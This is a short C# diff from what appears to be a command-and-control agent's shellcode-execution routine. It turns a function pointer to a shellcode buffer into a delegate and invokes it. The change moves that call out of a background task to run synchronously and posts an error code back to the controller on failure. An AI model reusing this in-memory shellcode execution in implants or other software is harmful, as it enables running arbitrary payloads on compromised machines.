@@ -90,22 +90,20 @@ namespace Agent
 
             // Create a delegate to the shellcode
             BufferDelegate shellcodeDelegate = (BufferDelegate)Marshal.GetDelegateForFunctionPointer(bufAddr, typeof(BufferDelegate));
-            Task t = Task.Run(() => {
-                try
+            try
+            {
+                shellcodeDelegate.Invoke();
+            }
+            catch
+            {
+                messageManager.AddResponse(new ResponseResult()
                 {
-                    shellcodeDelegate.Invoke();
-                }
-                catch
-                {
-                    messageManager.AddResponse(new ResponseResult()
-                    {
-                        completed = false,
-                        process_response = new Dictionary<string, string> { { "message", "0x44" } },
-                        task_id = job.task.id,
-                        status = "error"
-                    });
-                }
-            });
+                    completed = false,
+                    process_response = new Dictionary<string, string> { { "message", "0x44" } },
+                    task_id = job.task.id,
+                    status = "error"
+                });
+            }
         }
 
         private void Redirector_WriteEvent(object? sender, ConsoleWriterEventArgs e)
